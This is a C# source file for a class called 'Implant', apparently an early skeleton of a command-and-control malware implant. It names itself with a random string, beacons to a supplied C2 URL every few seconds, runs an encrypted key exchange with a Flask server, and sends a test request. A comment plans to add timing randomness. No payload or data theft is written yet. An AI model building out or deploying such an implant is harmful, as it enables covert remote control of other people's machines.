using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Test23
{
    class Implant
    {


        private CommunicationProvider comprov;

        private int sleepTimer = 5;

        private string name;

        public Implant(string c2Url)
        {
            //By Default we wait 5 sec between asking for stuff unless its update. Need to add some randomness in there but thats for later
            this.sleepTimer = 5;
            this.name = generateImplantName();


            this.comprov = new HTTPCommunicationProvider(c2Url, this.name);

            this.comprov.keyExchangeSetup();
            //Send a request with the publicKey to the flask server. Server uses public key to encrypt a newly generated aes key. We decrypt it with private cert and store it for future communications
            
            string response = comprov.sendEncryptedRequest("lol this is a test", "/test");
            
        }

       
        private string generateImplantName()
        {
              Random random = new Random();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, 10)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }



    }
}
